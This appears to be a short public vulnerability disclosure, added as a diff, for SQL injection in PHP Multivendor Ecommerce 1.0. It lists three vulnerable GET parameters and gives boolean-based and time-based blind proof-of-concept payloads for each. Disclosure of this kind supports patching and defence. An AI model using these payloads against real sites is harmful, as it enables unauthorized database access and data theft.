@@ -1,0 +1,49 @@
+# # # # # 
+# Exploit Title: PHP Multivendor Ecommerce 1.0 - SQL Injection
+# Dork: N/A
+# Date: 09.12.2017
+# Vendor Homepage: https://www.phpscriptsmall.com/
+# Software Link: https://www.phpscriptsmall.com/product/php-multivendor-ecommerce/
+# Version: 1.0
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+# # # # #
+# Exploit Author: Ihsan Sencan
+# Author Web: http://ihsan.net
+# Author Social: @ihsansencan
+# # # # #
+# Description:
+# The vulnerability allows an attacker to inject sql commands....
+# 
+# Proof of Concept: 
+# 
+# 1)
+# http://localhost/[PATH]/single_detail.php?sid=[SQL]
+# 
+# Parameter: sid (GET)
+#     Type: boolean-based blind
+#     Title: AND boolean-based blind - WHERE or HAVING clause
+#     Payload: sid=22 AND 4059=4059
+# 
+#     Type: AND/OR time-based blind
+#     Title: MySQL >= 5.0.12 AND time-based blind
+#     Payload: sid=22 AND SLEEP(5)
+# 
+# 2)
+# http://localhost/[PATH]/category.php?searchcat=[SQL]
+# 
+# Parameter: searchcat (GET)
+#     Type: boolean-based blind
+#     Title: AND boolean-based blind - WHERE or HAVING clause
+#     Payload: searchcat=s%' AND 4309=4309 AND '%'='
+# 
+# 3)
+# http://localhost/[PATH]/category.php?chid1=[SQL]
+# 
+# Parameter: chid1 (GET)
+#     Type: AND/OR time-based blind
+#     Title: MySQL >= 5.0.12 AND time-based blind
+#     Payload: chid1=46' AND SLEEP(5) AND 'DzvZ'='DzvZ
+# 
+# # # # #
